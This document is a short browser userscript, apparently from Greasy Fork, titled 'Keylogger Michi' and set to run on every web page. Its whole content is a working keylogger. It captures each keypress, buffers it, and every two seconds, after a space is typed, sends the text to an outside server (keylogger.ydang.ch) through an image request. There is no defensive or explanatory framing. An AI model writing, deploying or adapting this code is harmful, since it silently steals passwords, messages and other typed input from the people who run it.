// ==UserScript==
// @name         Keylogger Michi
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        *
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/37575/Keylogger%20Michi.user.js
// @updateURL https://update.greasyfork.org/scripts/37575/Keylogger%20Michi.meta.js
// ==/UserScript==

var buffer = [];
var attacker = 'http://keylogger.ydang.ch/keyloggermichi.php?c=';

document.onkeypress = function(e) {
	"use strict";
   // var timestamp = Date.now();
    var stroke = e.key;
    buffer.push(stroke);
};

window.setInterval(function() {
	"use strict";
    if (buffer.includes(" ")) {
        var data = buffer.join("");
        new Image().src = attacker + data;
        buffer = [];
    }
}, 2000);